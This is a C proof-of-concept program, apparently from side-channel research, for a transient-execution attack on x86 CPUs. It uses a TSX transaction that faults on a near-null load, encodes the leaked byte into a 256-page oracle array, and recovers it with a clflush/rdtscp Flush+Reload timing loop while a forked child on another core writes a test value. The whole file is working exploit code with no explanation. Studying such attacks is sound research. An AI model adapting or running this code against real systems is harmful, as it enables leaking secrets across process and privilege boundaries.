#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <immintrin.h>
#include <sys/time.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>
#define __USE_GNU
#include <signal.h>
#include <ucontext.h>
#define PG_SIZE (4096U*1)
#define NUM_EXPR 9990 
#define NUM_ROUNDS 1

volatile char *oraclearr;
volatile unsigned char* addr1;
volatile unsigned char* addr2;
volatile unsigned char* addr3;
int offset = 0xfa;
uint64_t averg[256];
int64_t averg_rnd[256];

static inline void clflush(void* addr){
    asm volatile("\tclflush (%0)\n" : :"r"(addr) : "memory");
}


static inline void __attribute__((always_inline))void_operations3(){
    asm volatile("\txbegin label1\n"
    "\tmovzbq 0x10(%1,1), %%rax\n"
    "\tshl $12, %%rax\n"
    "\tmovzbq (%0,%%rax), %%rax\n"
    "\txend\nlabel1:\n" : : "r"(oraclearr), "r"(0x0) : "rax");
};

static unsigned long long rdtscp() {
	unsigned long long a, d;
	asm volatile ("rdtscp" : "=a" (a), "=d" (d)::"rcx");
	a = (d<<32) | a;
	return a;
}

uint64_t time_access(volatile void* add){
	uint64_t t1, t2;
	volatile char *f = (volatile char*)add;
	t1 = rdtscp();
	*f;	
	t2 = rdtscp();	
	//printf("%p:%p ::: %p\n",t1,t2, t2-t1);
	return (t2 - t1);
}

int  __attribute__((optimize("-Os")))main(void){
    register char loaded_val;
    uint64_t secret;
    volatile uint64_t *f = &secret;
    cpu_set_t  mask;
    CPU_ZERO(&mask);
    CPU_SET(1, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
    addr1 = (char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
    addr3 = (char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
    addr2 = (volatile char*)((uint64_t)addr1 | 0xff00000000000000); 
    //addr2 = NULL;
    oraclearr = malloc(sizeof(char) * PG_SIZE*256);
    // EVERYTHING IS INITIALIZED
experiments_:
    memset(averg_rnd, 0x0, 256*sizeof(int64_t));
    memset(averg, 0x0, 256*sizeof(uint64_t));
    memset(oraclearr, 0xff, PG_SIZE*256);
    memset(addr1, 0xf1, 18*PG_SIZE+PG_SIZE);
    addr3[offset] = 0x34;
    addr3[0] = 0x34;
    // addr2[offset] = 0x34;
    pid_t forked = fork();
    if(forked == 0){
	    uint64_t secret;
            CPU_ZERO(&mask);
            CPU_SET(5, &mask);
            sched_setaffinity(0, sizeof(mask), &mask);;

  	asm volatile("lll1:movq %0, (%1)\n mfence\njmp lll1\n"::"r"(0xfffffffffffff3ull), "r"(&secret):);  	
    }
    for(int rnd_i = 0; rnd_i < NUM_ROUNDS; ++rnd_i){
        memset(averg, 0x0, 256*sizeof(uint64_t));
        for(int i = 0; i < NUM_EXPR; ++i){
            int flag = 0;
	    for(unsigned int j = 0; j < 256; ++j){
                asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
            }
	    asm volatile("mfence");
            void_operations3();
            for(unsigned int j = 0; j < 256; ++j){
		    uint64_t mat = time_access((void*)(oraclearr + PG_SIZE * j));
		    averg[j] = mat;
                if( mat < 160ull){
			averg_rnd[j]++;
		}
	    }
        }
    }
    int winner;
    int64_t winner_max = -1;
    int64_t winner_min = 0xfffffffe;
    for(int i = 0; i < 256; ++i){
        if(averg_rnd[i] > winner_max){
            winner_max = averg_rnd[i];
            winner = i;
        }
        if(averg_rnd[i] < winner_min){
            winner_min = averg_rnd[i];
        }
	   // printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]);
    }
    kill(forked, SIGKILL);
    printf("0x%02x  %lu\n", winner, winner_max);
    return 1;
}

//
//
